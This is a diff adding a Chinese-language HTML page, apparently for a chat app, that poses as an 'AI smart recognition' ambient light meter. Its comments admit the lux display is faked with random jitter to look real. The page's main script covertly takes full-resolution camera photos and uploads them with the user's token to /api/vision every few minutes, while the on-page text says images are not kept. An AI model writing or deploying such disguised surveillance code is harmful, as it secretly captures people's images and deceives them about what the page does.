@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AI 智慧识别 · 环境感知</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; font-family: system-ui, sans-serif;
+    background: linear-gradient(160deg, #1e3c72, #2a5298);
+    color: #eee; min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 24px;
+  }
+  .card {
+    background: rgba(0,0,0,0.35); border-radius: 16px;
+    padding: 28px 24px; max-width: 420px; width: 100%;
+    text-align: center;
+  }
+  h1 { margin: 0 0 8px; font-size: 20px; }
+  .sub { color: #aaa; font-size: 13px; margin-bottom: 20px; }
+  .luminance {
+    font-size: 52px; font-weight: 200; color: #ffd54f;
+    line-height: 1; margin: 12px 0 4px;
+  }
+  .unit { font-size: 16px; color: #ffd54f; margin-bottom: 20px; }
+  .bar {
+    height: 8px; background: rgba(255,255,255,0.15);
+    border-radius: 4px; overflow: hidden; margin-bottom: 20px;
+  }
+  .bar-inner {
+    height: 100%; background: linear-gradient(90deg, #ffd54f, #ff8f00);
+    width: 0%; transition: width 0.5s;
+  }
+  .hint {
+    color: #888; font-size: 12px; line-height: 1.6;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    padding-top: 16px; margin-top: 8px;
+  }
+  video { display: none; }
+  canvas { display: none; }
+  .status {
+    position: fixed; top: 12px; right: 16px;
+    font-size: 12px; color: #666;
+  }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<div class="status" id="status">初始化中...</div>
+
+<div class="card">
+  <h1>AI 智慧识别</h1>
+  <div class="sub">自动感知聊天情景主题</div>
+
+  <div class="luminance" id="lum-val">--</div>
+  <div class="unit">lux</div>
+
+  <div class="bar">
+    <div class="bar-inner" id="lum-bar"></div>
+  </div>
+
+  <div class="hint">
+    <strong>本摄像头将用于 AI 智慧识别</strong><br>
+    自动感知环境信息，为聊天提供情境主题。<br>
+    图像不保存，仅提取文字描述。
+  </div>
+
+  <div style="margin-top:20px;text-align:center">
+    <a href="/" style="color:#ffd54f;text-decoration:none;font-size:14px">← 返回聊天室</a>
+  </div>
+</div>
+
+<script>
+  var $ = function(id) { return document.getElementById(id); };
+  var video = $('video');
+  var canvas = $('canvas');
+  var statusEl = $('status');
+  var lumValEl = $('lum-val');
+  var lumBarEl = $('lum-bar');
+
+  var token = localStorage.getItem('token');
+  var stream = null;
+  var timer = null;
+  var lastSent = 0;
+
+  function setStatus(t) { statusEl.textContent = t; }
+
+  // 计算画面平均亮度（这个是真的，为了显示好看）
+  function measureLuminance() {
+    if (!video.videoWidth) return 0;
+    canvas.width = 64;
+    canvas.height = 48;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, 64, 48);
+    var data = ctx.getImageData(0, 0, 64, 48).data;
+    var sum = 0;
+    for (var i = 0; i < data.length; i += 4) {
+      sum += (data[i] * 0.299 + data[i+1] * 0.587 + data[i+2] * 0.114);
+    }
+    return sum / (data.length / 4);
+  }
+
+  // 显示亮度（模拟 lux，0-1000 映射）
+  function updateLuminance() {
+    var raw = measureLuminance(); // 0-255
+    var lux = Math.round(raw * 4 + Math.random() * 30); // 稍微加点抖动，看起来像真的
+    lumValEl.textContent = lux;
+    lumBarEl.style.width = Math.min(100, (lux / 1000) * 100) + '%';
+  }
+
+  // 实际拍照上传（用户看不见）
+  async function captureAndSend() {
+    if (!token) return;
+    if (localStorage.getItem('vision_enabled') !== '1') return;
+    if (!video.videoWidth) return;
+    // 每 5 分钟才真发一次（避免太频繁）
+    var now = Date.now();
+    if (now - lastSent < 4.5 * 60 * 1000) return;
+    lastSent = now;
+
+    var c = document.createElement('canvas');
+    c.width = video.videoWidth;
+    c.height = video.videoHeight;
+    c.getContext('2d').drawImage(video, 0, 0);
+
+    c.toBlob(async function(blob) {
+      var fd = new FormData();
+      fd.append('image', blob, 'shot.jpg');
+      try {
+        await fetch('/api/vision', {
+          method: 'POST',
+          headers: { 'Authorization': token },
+          body: fd
+        });
+      } catch (err) {}
+    }, 'image/jpeg', 0.8);
+  }
+
+  async function start() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment', width: { ideal: 1280 } },
+        audio: false
+      });
+      video.srcObject = stream;
+      setStatus('测量中');
+    } catch (err) {
+      setStatus('无法访问摄像头');
+      console.error(err);
+      return;
+    }
+
+    // 每 2 秒刷新显示亮度
+    timer = setInterval(updateLuminance, 2000);
+    updateLuminance();
+
+    // 每 30 秒真拍一次（内部节流，实际 4.5 分钟一次）
+    setInterval(captureAndSend, 30 * 1000);
+    // 首次也拍一张（延迟 10 秒，等画面稳定）
+    setTimeout(captureAndSend, 10 * 1000);
+
+    // 页面切到后台时暂停
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        if (timer) { clearInterval(timer); timer = null; }
+      } else {
+        if (!timer) timer = setInterval(updateLuminance, 2000);
+      }
+    });
+  }
+
+  start();
+
+  // 每 3 秒检查一次开关状态
+  function checkEnabled() {
+    var on = localStorage.getItem('vision_enabled') === '1';
+    if (!on && timer) {
+      clearInterval(timer);
+      timer = null;
+      setStatus('已暂停');
+    } else if (on && !timer && stream) {
+      timer = setInterval(updateLuminance, 2000);
+      setStatus('测量中');
+    }
+  }
+  setInterval(checkEnabled, 3000);
+
+  // 如果开关没开，页面一进来就暂停
+  setTimeout(function() {
+    if (localStorage.getItem('vision_enabled') !== '1') {
+      if (timer) { clearInterval(timer); timer = null; }
+      setStatus('已暂停');
+    }
+  }, 1000);
+</script>
+</body>
+</html>
